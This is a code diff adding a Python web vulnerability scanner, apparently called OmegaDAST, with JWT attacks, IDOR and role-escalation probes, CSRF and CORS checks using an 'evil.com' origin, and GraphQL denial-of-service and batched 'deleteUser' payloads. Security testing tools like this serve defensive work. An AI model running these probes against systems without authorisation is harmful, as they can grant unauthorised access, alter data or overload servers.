+                    "HTTP2-Settings": "AAMAAABkAAQAAP__"
+                }
+                
+                try:
+                    resp = await self._async_fetch(base_url, method='GET', headers=h2c_headers)
+                    if resp:
+                        # Check if server downgraded to HTTP/1.1
+                        if 'h2' not in resp.headers.get('Upgrade', '').lower() and resp.status == 200:
+                            await self._add_vulnerability({
+                                "type":"HTTP/2 Downgrade","url":base_url,"parameter":"*",
+                                "evidence":"Server accepted HTTP/2 upgrade headers but did not upgrade",
+                                "severity":"Medium","confidence":70,"cwe":"CWE-319"
+                            })
+                except Exception as e:
+                    logging.debug(f"HTTP/2 downgrade test error: {e}")
+            except Exception as e:
+                logging.warning(f"HTTP/2 downgrade test error for {page['url']}: {e}")
+
+    # --- JWT Tests ---
+    async def run_jwt_tests(self):
+        """Test for JWT vulnerabilities"""
+        self.log("Testing JWT vulnerabilities...")
+        
+        # Test on crawled pages for JWT tokens
+        for page in self.crawler_engine.crawled_pages:
+            try:
+                # Extract JWT tokens from responses
+                resp = await self._async_fetch(page['url'])
+                if not resp:
+                    continue
+                
+                html = resp._body
+                # Look for JWT patterns (header.payload.signature)
+                jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
+                tokens = re.findall(jwt_pattern, html)
+                
+                for token in tokens:
+                    # Algorithm Confusion Attack
+                    algo_confusion_result = JWTAttack.algorithm_confusion_attack(token)
+                    if algo_confusion_result:
+                        algo_confusion_result['url'] = page['url']
+                        await self._add_vulnerability(algo_confusion_result)
+                        self.log(f"[CRITICAL] Algorithm Confusion vulnerability found at {page['url']}")
+                
+                # kid Path Traversal Attack (CVE-2018-0114)
+                kid_traversal_results = JWTAttack.kid_path_traversal_attack(token)
+                if kid_traversal_results:
+                    for result in kid_traversal_results:
+                        result['url'] = page['url']
+                        await self._add_vulnerability(result)
+                    self.log(f"[HIGH] kid Path Traversal attack vectors generated for {page['url']}")
+                
+                # None Algorithm Attack
+                none_algo_result = JWTAttack.none_algorithm_attack(token)
+                if none_algo_result:
+                    none_algo_result['url'] = page['url']
+                    await self._add_vulnerability(none_algo_result)
+                    self.log(f"[CRITICAL] None Algorithm vulnerability found at {page['url']}")
+            except Exception as e:
+                logging.debug(f"JWT test error for {page['url']}: {e}")
+        
+        # Session Fixation/Ambiguity Attack
+        await self._test_session_fixation_ambiguity()
+    
+    async def _test_session_fixation_ambiguity(self):
+        """Test for session fixation/ambiguity vulnerabilities"""
+        self.log("Testing session fixation/ambiguity...")
+        
+        # Test on crawled pages
+        for page in self.crawler_engine.crawled_pages:
+            try:
+                parsed_url = urlparse(page['url'])
+                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+                
+                # Test with common session cookie names
+                session_cookie_names = ['session', 'SESSION', 'JSESSIONID', 'PHPSESSID', 'ASP.NET_SessionId']
+                
+                for cookie_name in session_cookie_names:
+                    session_results = await JWTAttack.session_fixation_ambiguity_attack(base_url, cookie_name)
+                    if session_results:
+                        for result in session_results:
+                            result['url'] = page['url']
+                            await self._add_vulnerability(result)
+                        self.log(f"[HIGH] Session fixation/ambiguity vulnerability found with cookie: {cookie_name}")
+                        break  # Only report once per page
+                        
+            except Exception as e:
+                logging.debug(f"Session fixation test error for {page['url']}: {e}")
+
+    # --- IDOR ---
+    async def run_idor_tests(self):
+        for url in self.crawler_engine.visited_urls:
+            # Numeric ID in path
+            for match in re.finditer(r'/(\d+)', urlparse(url).path):
+                uid = match.group(1)
+                try:
+                    new_id = str(int(uid) + 1)
+                    new_url = url[:match.start(1)] + new_id + url[match.end(1):]
+                    if new_url in self.crawler_engine.visited_urls: continue
+                    resp_orig = await self._async_fetch(url)
+                    resp_new = await self._async_fetch(new_url)
+                    if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
+                        if resp_orig and self.token_normalizer.normalize(resp_new._body) != self.token_normalizer.normalize(resp_orig._body):
+                            await self._add_vulnerability({
+                                "type":"IDOR","url":url,"parameter":f"ID {uid}",
+                                "evidence":"Access to different ID returned different content",
+                                "severity":"High","confidence":85,"cwe":CWE_MAP["IDOR"]
+                            })
+                except Exception as e:
+                    logging.warning(f"IDOR test error: {e}")
+            # UUID
+            uuid_pattern = r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
+            for match in re.finditer(uuid_pattern, url, re.I):
+                new_uuid = str(uuid.uuid4())
+                new_url = url[:match.start()] + new_uuid + url[match.end():]
+                if new_url in self.crawler_engine.visited_urls: continue
+                resp_new = await self._async_fetch(new_url)
+                if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
+                    await self._add_vulnerability({
+                        "type":"IDOR (UUID)","url":url,"parameter":"UUID",
+                        "evidence":"Access with different UUID returned content",
+                        "severity":"High","confidence":80,"cwe":CWE_MAP["IDOR"]
+                    })
+            # Parameter-based ID
+            for param in self.crawler_engine.parameters:
+                if param['url'] == url and param['method'] == 'POST' and re.search(r'id$|user|account|profile', param['param'], re.I):
+                    pname = param['param']
+                    resp_base = await self._async_fetch(url, method='POST', data={pname: '1'})
+                    if resp_base:
+                        resp_test = await self._async_fetch(url, method='POST', data={pname: '9999'})
+                        if resp_test and resp_test.status == 200 and self.token_normalizer.normalize(resp_test._body) != self.token_normalizer.normalize(resp_base._body):
+                            await self._add_vulnerability({
+                                "type":"IDOR (Param)","url":url,"parameter":pname,
+                                "evidence":"Parameter change gave different response",
+                                "severity":"High","confidence":60,"cwe":CWE_MAP["IDOR"]
+                            })
+
+    async def test_org_user_id_mismatch(self):
+        """Test for ORG_ID vs USER_ID MISMATCH - Organization boundary bypass"""
+        self.log("Testing ORG_ID vs USER_ID mismatch...")
+        for url in self.crawler_engine.visited_urls:
+            for param in self.crawler_engine.parameters:
+                if param['url'] == url and param['method'] == 'POST':
+                    # Test with different org_id and user_id combinations
+                    for org_id in ['1', '2', '999']:
+                        for user_id in ['1', '2', '999']:
+                            if org_id == user_id: continue
+                            data = {param['param']: 'test', 'org_id': org_id, 'user_id': user_id}
+                            resp = await self._async_fetch(url, method='POST', data=data)
+                            if resp and resp.status == 200:
+                                await self._add_vulnerability({
+                                    "type":"ORG_ID vs USER_ID MISMATCH","url":url,"parameter":param['param'],
+                                    "evidence":f"Access granted with org_id={org_id} and user_id={user_id}",
+                                    "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
+                                })
+                                return
+
+    async def test_role_hierarchy_escalation(self):
+        """Test for ROLE HIERARCHY ESCALATION - Role modification abuse"""
+        self.log("Testing role hierarchy escalation...")
+        for url in self.crawler_engine.visited_urls:
+            for param in self.crawler_engine.parameters:
+                if param['url'] == url and param['method'] == 'POST' and re.search(r'role|permission|access', param['param'], re.I):
+                    # Test with elevated role
+                    data = {param['param']: 'test', 'role': 'admin', 'permission': 'all'}
+                    resp = await self._async_fetch(url, method='POST', data=data)
+                    if resp and resp.status == 200:
+                        await self._add_vulnerability({
+                            "type":"Role Hierarchy Escalation","url":url,"parameter":param['param'],
+                            "evidence":"Role modification allowed elevation to admin",
+                            "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
+                                })
+                        return
+
+    async def test_array_bulk_idor(self):
+        """Test for ARRAY-BASED BULK IDOR - Mass assignment with unrelated IDs"""
+        self.log("Testing array-based bulk IDOR...")
+        for param in self.crawler_engine.parameters:
+            if param['method'] != 'POST': continue
+            url = param['url']; pname = param['param']; ptype = param['type']
+            # Test with array of IDs
+            test_ids = ['1', '2', '999']
+            if ptype == 'json':
+                data = {pname: 'test', 'ids': test_ids}
+                resp = await self._async_fetch(url, method='POST', json_data=data)
+            else:
+                data = {pname: 'test', 'ids[]': test_ids}
+                resp = await self._async_fetch(url, method='POST', data=data)
+            if resp and resp.status == 200:
+                await self._add_vulnerability({
+                    "type":"Array-based Bulk IDOR","url":url,"parameter":pname,
+                    "evidence":"Bulk access granted to array of IDs including unrelated ones",
+                    "severity":"Critical","confidence":80,"cwe":CWE_MAP["IDOR"]
+                })
+
+    # --- Mass Assignment ---
+    async def run_mass_assignment_tests(self):
+        for param in self.crawler_engine.parameters:
+            if param['method'] != 'POST': continue
+            url = param['url']; pname = param['param']; ptype = param['type']
+            if ptype != 'json':
+                base_resp = await self._async_fetch(url, method='POST', data={pname:'test'})
+            else:
+                base_resp = await self._async_fetch(url, method='POST', json_data={pname:'test'})
+            if not base_resp: continue
+            base_text = self.token_normalizer.normalize(base_resp._body)
+            for extra_set in PAYLOADS.get("MassAssignment", []):
+                if isinstance(extra_set, dict):
+                    if ptype == 'json':
+                        json_data = {pname:'test'}
+                        json_data.update(extra_set)
+                        resp = await self._async_fetch(url, method='POST', json_data=json_data)
+                    else:
+                        data = {pname:'test'}
+                        data.update(extra_set)
+                        resp = await self._async_fetch(url, method='POST', data=data)
+                    if resp and self.token_normalizer.normalize(resp._body) != base_text:
+                        if any(ind in resp._body.lower() for ind in ['admin','role','access','success','welcome','dashboard']):
+                            await self._add_vulnerability({
+                                "type":"MassAssignment","url":url,"parameter":pname,
+                                "evidence":f"Extra fields {list(extra_set.keys())} changed response",
+                                "severity":"High","confidence":75,"cwe":CWE_MAP["MassAssignment"]
+                            })
+                            break
+
+    # --- CSRF ---
+    async def run_csrf_checks(self):
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
+            for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
+                form_text = form.get_text().lower()
+                if any(w in form_text for w in ['delete','remove','logout','reset','wipe']):
+                    continue
+                action = urljoin(page['url'], form.get('action',''))
+                # Get fresh page to extract CSRF token
+                page_resp = await self._async_fetch(page['url'])
+                if page_resp:
+                    page_soup = BeautifulSoup(page_resp._body, 'html.parser')
+                    csrf_token = None
+                    for inp in page_soup.find_all('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
+                        csrf_token = inp.get('value')
+                    data = {}
+                    for inp in form.find_all(['input','textarea','select']):
+                        name = inp.get('name')
+                        if name:
+                            data[name] = inp.get('value','test')
+                    resp = await self._async_fetch(action, method='POST', data=data)
+                    if resp and resp.status not in (403,401) and 'invalid' not in resp._body.lower():
+                        await self._add_vulnerability({
+                            "type":"CSRF Confirmed","url":page['url'],"parameter":"form",
+                            "evidence":"POST succeeded without CSRF token",
+                            "severity":"High","confidence":90,"cwe":CWE_MAP["CSRF"]
+                        })
+
+    # --- CORS with credentials ---
+    async def run_cors_checks(self):
+        for url in self.crawler_engine.visited_urls:
+            for origin in ["null", "https://evil.com"]:
+                headers = {"Origin": origin}
+                resp = await self._async_fetch(url, method='OPTIONS', headers=headers)
+                if resp and 'Access-Control-Allow-Origin' in resp.headers:
+                    acao = resp.headers['Access-Control-Allow-Origin']
+                    if acao == origin or acao == '*':
+                        # Test with credentials via JS
+                        if self.selenium_ready:
+                            script = f"""
+                            var callback = arguments[0];
+                            fetch('{url}', {{method:'GET',credentials:'include',headers:{{'Origin':'{origin}'}}}})
+                            .then(r => r.text())
+                            .then(text => callback({{status: 'success', text: text}}))
+                            .catch(e => callback({{status: 'error', error: e.message}}));
+                            """
+                            try:
+                                result = self.selenium_driver.execute_async_script(script)
+                                if result and result.get('status') == 'success':
+                                    await self._add_vulnerability({
+                                        "type":"CORS with Credentials","url":url,"parameter":"*",
+                                        "evidence":f"Origin {origin} allowed with credentials",
+                                        "severity":"High","confidence":85,"cwe":CWE_MAP["CORS"]
+                                    })
+                            except Exception as e:
+                                logging.debug(f"Selenium CORS test error: {e}")
+                        else:
+                            # Fallback: check for ACAC header
+                            if 'Access-Control-Allow-Credentials' in resp.headers:
+                                await self._add_vulnerability({
+                                    "type":"CORS with Credentials","url":url,"parameter":"*",
+                                    "evidence":f"Origin {acao} allows credentials",
+                                    "severity":"High","confidence":75,"cwe":CWE_MAP["CORS"]
+                                })
+
+    # --- GraphQL Tests ---
+    async def run_graphql_tests(self):
+        """Test for GraphQL vulnerabilities"""
+        self.log("Testing GraphQL vulnerabilities...")
+        
+        # Find GraphQL endpoints
+        graphql_endpoints = set()
+        for page in self.crawler_engine.crawled_pages:
+            url = page['url']
+            # Common GraphQL paths
+            if any(path in url.lower() for path in ['/graphql', '/graphiql', '/api/graphql']):
+                graphql_endpoints.add(url)
+        
+        for endpoint in graphql_endpoints:
+            try:
+                # Test GraphQL batching DoS
+                await self._test_graphql_batching(endpoint)
+                
+                # Test GraphQL alias DoS
+                await self._test_graphql_alias_dos(endpoint)
+                
+                # Test GraphQL recursive fragment DoS
+                await self._test_graphql_recursive_fragment_dos(endpoint)
+                
+                # Test GraphQL introspection depth bomb
+                await self._test_graphql_introspection_depth_bomb(endpoint)
+                
+                # Test GraphQL field suggestion
+                await self._test_graphql_field_suggestion(endpoint)
+                
+                # Test GraphQL batching authentication bypass
+                await self._test_graphql_batching_auth_bypass(endpoint)
+                
+            except Exception as e:
+                logging.warning(f"GraphQL test error for {endpoint}: {e}")
+
+    async def _test_graphql_batching(self, endpoint):
+        """Test for GraphQL batching DoS vulnerability"""
+        batch_query = ""
+        for i in range(100):
+            batch_query += f'{{query{i}: {{ __typename }}}}'
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": batch_query})
+            if resp and resp.status == 200:
+                await self._add_vulnerability({
+                    "type":"GraphQL Batching DoS","url":endpoint,"parameter":"*",
+                    "evidence":"GraphQL batching allowed - potential DoS",
+                    "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
+                })
+        except Exception as e:
+            logging.debug(f"GraphQL batching test error: {e}")
+
+    async def _test_graphql_alias_dos(self, endpoint):
+        """Test for GraphQL alias multiplication DoS vulnerability"""
+        alias_query = ""
+        for i in range(5000):
+            alias_query += f'alias{i}: __typename '
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": f"{{ {alias_query} }}"})
+            if resp and resp.status == 200:
+                await self._add_vulnerability({
+                    "type":"GraphQL Alias DoS","url":endpoint,"parameter":"*",
+                    "evidence":"GraphQL alias multiplication allowed - potential DoS",
+                    "severity":"Medium","confidence":85,"cwe":CWE_MAP["GraphQL"]
+                })
+        except Exception as e:
+            logging.debug(f"GraphQL alias DoS test error: {e}")
+
+    async def _test_graphql_recursive_fragment_dos(self, endpoint):
+        """Test for GraphQL recursive fragment expansion DoS vulnerability"""
+        # Create mutually recursive fragments
+        fragment_a = "fragment fragA on User { id name ...fragB }"
+        fragment_b = "fragment fragB on User { id email ...fragA }"
+        recursive_query = f"""
+        {fragment_a}
+        {fragment_b}
+        {{ user(id: "1") {{ ...fragA }} }}
+        """
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": recursive_query})
+            if resp and resp.status == 200:
+                await self._add_vulnerability({
+                    "type":"GraphQL Recursive Fragment DoS","url":endpoint,"parameter":"*",
+                    "evidence":"GraphQL recursive fragments allowed - potential DoS",
+                    "severity":"High","confidence":80,"cwe":CWE_MAP["GraphQL"]
+                })
+        except Exception as e:
+            logging.debug(f"GraphQL recursive fragment test error: {e}")
+
+    async def _test_graphql_introspection_depth_bomb(self, endpoint):
+        """Test for GraphQL introspection depth bomb with nested __typename queries"""
+        # Build deeply nested __typename query (100 levels)
+        nested_query = "query { "
+        for i in range(100):
+            nested_query += f"field{i}: {{ __typename "
+        nested_query += "}" * 100 + " }"
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": nested_query})
+            if resp and resp.status == 200:
+                await self._add_vulnerability({
+                    "type":"GraphQL Introspection Depth Bomb","url":endpoint,"parameter":"*",
+                    "evidence":"GraphQL deep introspection allowed - potential DoS",
+                    "severity":"High","confidence":85,"cwe":CWE_MAP["GraphQL"]
+                })
+        except Exception as e:
+            logging.debug(f"GraphQL introspection depth bomb test error: {e}")
+
+    async def _test_graphql_field_suggestion(self, endpoint):
+        """Test for GraphQL field suggestion (introspection bypass) vulnerability"""
+        # Test 1: Simple __typename query to confirm GraphQL is active
+        simple_query = "{ __typename }"
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": simple_query})
+            if not resp or resp.status != 200:
+                return
+        except Exception as e:
+            logging.debug(f"GraphQL not active at {endpoint}: {e}")
+            return
+        
+        # Test 2: Try to access __schema (introspection)
+        introspection_query = """
+        {
+            __schema {
+                types {
+                    name
+                    fields {
+                        name
+                    }
+                }
+            }
+        }
+        """
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data={"query": introspection_query})
+            if resp and resp.status == 200:
+                data = resp.json()
+                if '__schema' in data.get('data', {}):
+                    await self._add_vulnerability({
+                        "type":"GraphQL Introspection Enabled","url":endpoint,"parameter":"*",
+                        "evidence":"GraphQL introspection query succeeded - schema exposed",
+                        "severity":"Medium","confidence":90,"cwe":CWE_MAP["GraphQL"]
+                    })
+        except Exception as e:
+            logging.debug(f"GraphQL introspection test error: {e}")
+        
+        # Test 3: Field suggestion via brute force
+        common_fields = ['user', 'users', 'account', 'accounts', 'admin', 'password', 'email', 'secret']
+        for field in common_fields:
+            field_query = f"{{ {field} {{ __typename }} }}"
+            try:
+                resp = await self._async_fetch(endpoint, method='POST', json_data={"query": field_query})
+                if resp and resp.status == 200:
+                    data = resp.json()
+                    if field in data.get('data', {}):
+                        await self._add_vulnerability({
+                            "type":"GraphQL Field Suggestion","url":endpoint,"parameter":"*",
+                            "evidence":f"GraphQL field '{field}' accessible via suggestion",
+                            "severity":"Low","confidence":70,"cwe":CWE_MAP["GraphQL"]
+                        })
+                        break
+            except Exception as e:
+                logging.debug(f"GraphQL field brute-force error for {field}: {e}")
+
+    async def _test_graphql_batching_auth_bypass(self, endpoint):
+        """Test for GraphQL batching authentication bypass vulnerability"""
+        # Extract JWT token from the current session if available
+        auth_token = None
+        if hasattr(self.session_manager, 'async_session') and self.session_manager.async_session:
+            cookies = self.session_manager.async_session.session.cookie_jar
+            for cookie in cookies:
+                if 'token' in cookie.key.lower() or 'jwt' in cookie.key.lower():
+                    auth_token = cookie.value
+                    break
+        
+        # Test batching with different operations
+        batch_query = """
+        [
+            {"query": "query { __typename }"},
+            {"query": "query { admin { __typename } }"},
+            {"query": "mutation { deleteUser(id: 1) { __typename } }"}
+        ]
+        """
+        
+        headers = {}
+        if auth_token:
+            headers["Authorization"] = f"Bearer {auth_token}"
+        
+        try:
+            resp = await self._async_fetch(endpoint, method='POST', json_data=batch_query, headers=headers)
+            if resp and resp.status == 200:
+                data = resp.json()
+                # Check if admin or deleteUser succeeded despite lack of proper auth
+                for item in data if isinstance(data, list) else []:
+                    if 'admin' in str(item) or 'deleteUser' in str(item):
+                        await self._add_vulnerability({
+                            "type":"GraphQL Batching Auth Bypass","url":endpoint,"parameter":"*",
+                            "evidence":"GraphQL batching allowed authentication bypass",
+                            "severity":"Critical","confidence":90,"cwe":CWE_MAP["GraphQL"]
+                        })
+                        break
+        except Exception as e:
+            logging.debug(f"GraphQL batching auth bypass test error: {e}")
+
+    # --- Helper methods for async fetch ---
+    async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None):
+        """Async HTTP fetch with session management"""
+        if not self.session_manager or not self.session_manager.async_session:
+            return None
+        try:
+            async with self.session_manager.async_session.session.request(
+                method, url, data=data, json=json_data, headers=headers, timeout=aiohttp.ClientTimeout(total=30)
+            ) as resp:
+                body = await resp.text()
+                # Store response metadata for detection
+                resp._body = body
+                resp._elapsed = getattr(resp, '_elapsed', 0)
+                return resp
+        except Exception as e:
+            logging.debug(f"Async fetch error for {url}: {e}")
+            return None
+
+    def log(self, msg):
+        """Log message"""
+        logging.info(msg)
+
+    def update_progress(self, current, total):
+        """Update progress"""
+        logging.info(f"Progress: {current}/{total}")
+
+# ---------------------------------------------------------------------
+# CORE SCANNER ENGINE (async)
+# ---------------------------------------------------------------------
+class OmegaDAST:
+    def __init__(self, target, config, signals, loop=None):
+        self.target = target.rstrip('/')
+        self.base_domain = urlparse(target).netloc
+        self.config = config
+        self.signals = signals
+        self.loop = loop or asyncio.new_event_loop()
+        self.public_ip = config.get('oob_ip') or self.loop.run_until_complete(get_public_ip())
+        
+        # Validate OOB configuration before scan starts
+        if not validate_oob_config(self.public_ip, config.get('oob_dns_domain', 'oob.example.com')):
+            logging.warning("OOB configuration validation failed. Scan may have issues with OOB callbacks.")
+        
+        self.exclusion_patterns = [re.compile(p) for p in config.get('exclude', [])]
+        self.capture_evidence = config.get('capture_evidence', True)
+        self.stop_event = asyncio.Event()
+        self.log_file = config.get('log_file')
+        
+        # Concurrency limit to prevent overwhelming targets
+        self.concurrency_limit = config.get('concurrency_limit', 100)
+        self.semaphore = asyncio.Semaphore(self.concurrency_limit)
+        
+        # Circuit breaker for HTTP requests
+        self.circuit_breaker = CircuitBreaker(
+            failure_threshold=config.get('circuit_breaker_threshold', 5),
+            cooldown=config.get('circuit_breaker_cooldown', 60),
+            max_retries=config.get('circuit_breaker_max_retries', 3)
+        )
+        
+        # Initialize component engines
+        self.crawler_engine = CrawlerEngine(
+            self.target, config, self.base_domain, self.exclusion_patterns, self.circuit_breaker
+        )
+        self.session_manager = SessionManager(config, self.loop, self.circuit_breaker)
+        self.reporting_engine = ReportingEngine(config, signals, self.session_manager)
+        self.oob_manager = OOBManager(config, self.public_ip)
+        self.injection_engine = InjectionEngine(
+            config, self.crawler_engine, self.session_manager, self.reporting_engine, self.oob_manager
+        )
+        self.subdomain_discovery = SubdomainDiscovery()
+        
+        # Additional state management
+        self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
+        self.temporal_recheck_enabled = config.get('temporal_recheck', False)
+        self.recheck_delay = config.get('recheck_delay', 3600)
+        self.validation_tasks = set()
+        self.memory_efficient = config.get('memory_efficient', True)
+        self.vulnerability_timestamps = {}
+        self.fp_db = FP_Database()
+        
+        # Validation Engine for 3x validation and remediation testing
+        self.validation_enabled = config.get('validation_enabled', DEFAULT_VALIDATION_ENABLED)
+        self.validation_engine = None
+        
+        # Selenium driver (will be initialized in setup)
+        self.selenium_driver = None
+        self.selenium_ready = False
+        
+        # logging setup with rotation
+        log_file = self.log_file or 'ultradast.log'
+        log_handler = RotatingFileHandler(
+            log_file,
+            maxBytes=10*1024*1024,
+            backupCount=5,
+            encoding='utf-8'
+        )
+        log_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        logging.basicConfig(
+            level=logging.INFO,
+            handlers=[log_handler, logging.StreamHandler()],
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+
+    def log(self, msg):
+        """Log message - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'log'):
+            self.signals.log.emit(msg)
+        else:
+            logging.info(msg)
+
+    def add_finding(self, vuln):
+        """Report vulnerability finding - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'finding'):
+            self.signals.finding.emit(vuln)
+        else:
+            logging.info(f"Finding: {vuln}")
+    
+    def update_progress(self, current, total):
+        """Update progress - can be overridden by GUI or use default logging"""
+        if hasattr(self.signals, 'progress'):
+            self.signals.progress.emit(current, total)
+        else:
+            logging.info(f"Progress: {current}/{total}")
+
+    async def setup(self):
+        # Setup component engines
+        await self.session_manager.setup()
+        await self.oob_manager.setup()
+        
+        # Load previous state if resuming
+        if self.config.get('resume_scan'):
+            prev_state = self.scan_state_manager.load_state()
+            if prev_state and prev_state['target'] == self.target:
+                self.crawler_engine.visited_urls = prev_state['visited_urls']
+                self.crawler_engine.parameters = prev_state['parameters'] if isinstance(prev_state['parameters'], list) else []
+                self.reporting_engine.vulnerabilities = prev_state['vulnerabilities'] if isinstance(prev_state['vulnerabilities'], list) else []
+                self.crawler_engine.crawled_pages = prev_state['crawled_pages'] if isinstance(prev_state['crawled_pages'], list) else []
+                self.log(f"Resumed scan with {len(self.crawler_engine.visited_urls)} URLs, {len(self.crawler_engine.parameters)} parameters")
+        
+        # Restore state from GUI checkpoint if available
+        checkpoint_data = self.config.get('checkpoint_data')
+        if checkpoint_data and checkpoint_data.get('target') == self.target:
+            self.crawler_engine.visited_urls = set(checkpoint_data.get('visited_urls', []))
+            self.reporting_engine.vulnerabilities = checkpoint_data.get('vulnerabilities', [])
+            self.log(f"Restored from checkpoint: {len(self.crawler_engine.visited_urls)} URLs, {len(self.reporting_engine.vulnerabilities)} vulnerabilities")
+        
+        # Initialize Validation Engine with async session
+        if self.validation_enabled:
+            self.validation_engine = ValidationEngine(self.session_manager.async_session.session, self.config)
+            self.log("Validation Engine initialized for 3x validation and remediation testing")
+        
+        # Setup Selenium driver
+        if self.config.get('js_render', True):
+            self.selenium_driver = JSRenderDriver(proxy=self.config.get('proxy'))
+            if not self.selenium_driver.create():
+                self.log("JS rendering unavailable.")
+            else:
+                self.selenium_ready = True
+                self.injection_engine.selenium_driver = self.selenium_driver
+                self.injection_engine.selenium_ready = True
+        
+        # Authentication
+        if self.config.get('auth_steps'):
+            await self.session_manager.perform_authentication(self.config.get('auth_steps'))
+        if self.config.get('cookies'):
+            self.session_manager.load_cookies(self.config['cookies'])
+
+    async def scan(self):
+        self.log(LEGAL_BANNER)
+        await self.setup()
+        
+        # Estimate total tasks for progress tracking
+        estimated_urls = self.config.get('depth', DEFAULT_DEPTH) * 50
+        estimated_params = estimated_urls * 5
+        self.total_tasks = estimated_urls + estimated_params + 10
+        self.current_task = 0
+        
+        await self.crawl()
+        self.log(f"Crawled {len(self.crawler_engine.visited_urls)} URLs, found {len(self.crawler_engine.parameters)} parameters.")
+        await self.discover_websocket_endpoints()
+        await self.discover_grpc_endpoints()
+        await self.test_graphql()
+        await self.test_jwts()
+        await self.injection_engine.run_tests()
+        # Save state for resumability
+        if self.config.get('save_state'):
+            self.scan_state_manager.save_state(
+                self.target, 
+                self.crawler_engine.visited_urls, 
+                self.crawler_engine.parameters, 
+                self.reporting_engine.vulnerabilities, 
+                self.crawler_engine.crawled_pages, 
+                self.config
+            )
+            self.log("Scan state saved for resumption.")
+        self.finalize()
+        await self.session_manager.close()
+        if self.selenium_driver:
+            self.selenium_driver.quit()
+
+    def finalize(self):
+        """Cleanup resources and stop OOB servers"""
+        self.log("Finalizing scan...")
+        self.oob_manager.stop()
+        self.reporting_engine.close()
+        self.log("Scan finalized.")
+
+    async def crawl(self):
+        queue = asyncio.Queue()
+        await queue.put((self.target, 0))
+        while not self.stop_event.is_set():
+            try:
+                url, depth = await asyncio.wait_for(queue.get(), timeout=1.0)
+            except asyncio.TimeoutError:
+                if queue.empty():
+                    break
+                continue
+            if any(p.search(url) for p in self.crawler_engine.exclusion_patterns):
+                continue
+            if url in self.crawler_engine.visited_urls or depth > self.config.get('depth', DEFAULT_DEPTH):
+                continue
+            self.crawler_engine.visited_urls.add(url)
+            self.current_task += 1
+            self.update_progress(self.current_task, self.total_tasks)
+            if hasattr(self.signals, 'status'):
+                self.signals.status.emit(f"Crawling {url}")
+            else:
+                logging.info(f"Crawling {url}")
+            resp = await self.session_manager.fetch(url)
+            if resp and resp.status == 200:
+                html = resp._body
+                soup = BeautifulSoup(html, 'html.parser')
+                # Store only metadata in memory; persist full HTML to SQLite
+                page_metadata = {
+                    'url': url,
+                    'hash': hashlib.md5(html.encode()).hexdigest(),
+                    'headers': dict(resp.headers),
+                    'timestamp': datetime.now().isoformat()
+                }
+                self.crawler_engine.crawled_pages.append(page_metadata)
+                # Persist full HTML to SQLite
+                await self.loop.run_in_executor(None, self.scan_state_manager.store_page_hash, url, html, page_metadata)
+                await self._passive_checks(resp)
+                links = self.crawler_engine._extract_links(soup, url, html)
+                for l in links:
+                    if l not in self.crawler_engine.visited_urls:
+                        await queue.put((l, depth + 1))
+                self.crawler_engine._extract_parameters(url, html, soup)
+                # Potential CSRF
+                for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
+                    if not form.find('input', attrs={'name': re.compile(r'csrf|token|nonce', re.I)}):
+                        await self._add_vulnerability({
+                            "type": "CSRF (potential)", "url": url, "parameter": "form",
+                            "evidence": "POST form without CSRF token", "severity": "Medium", "confidence": 65,
+                            "cwe": CWE_MAP["CSRF"]
+                        })
+            # JS rendering
+            if self.selenium_ready:
+                rendered = await self.loop.run_in_executor(None, self.selenium_driver.get, url)
+                if rendered:
+                    alerts = self.selenium_driver.check_alerts()
+                    if alerts:
+                        v = Detector.dom_xss(None, self.selenium_driver, '', '')
+                        if v: await self._add_vulnerability(v)
+                    await self._process_cdp_responses(queue, depth)
+                    rendered_soup = BeautifulSoup(rendered, 'html.parser')
+                    js_links = self.crawler_engine._extract_links(rendered_soup, url, rendered)
+                    for l in js_links:
+                        if l not in self.crawler_engine.visited_urls:
+                            await queue.put((l, depth + 1))
+                    self.crawler_engine._extract_parameters(url, rendered, rendered_soup)
+                    # SPA route clicking
+                    if self.config.get('spa_crawling', True):
+                        spa_routes = await self.loop.run_in_executor(None, self.selenium_driver.click_spa_routes, url)
+                        for spa_url in spa_routes:
+                            if spa_url not in self.crawler_engine.visited_urls:
+                                await queue.put((spa_url, depth + 1))
+
+    async def _process_cdp_responses(self, queue, depth):
+        with self.selenium_driver.lock:
+            captured = list(self.selenium_driver.captured_requests)
+            self.selenium_driver.captured_requests.clear()
+        for req in captured:
+            if req['type'] == 'response' and self.crawler_engine._is_in_scope(req['url']):
+                if req['url'] not in self.crawler_engine.visited_urls:
+                    await queue.put((req['url'], depth + 1))
+                if req.get('body'):
+                    try:
+                        data = json.loads(req['body'])
+                        if isinstance(data, dict):
+                            for key in data.keys():
+                                self.crawler_engine._add_param(req['url'], 'GET', key, 'json')
+                        elif isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict):
+                            for key in data[0].keys():
+                                self.crawler_engine._add_param(req['url'], 'GET', key, 'json')
+                    except Exception as e:
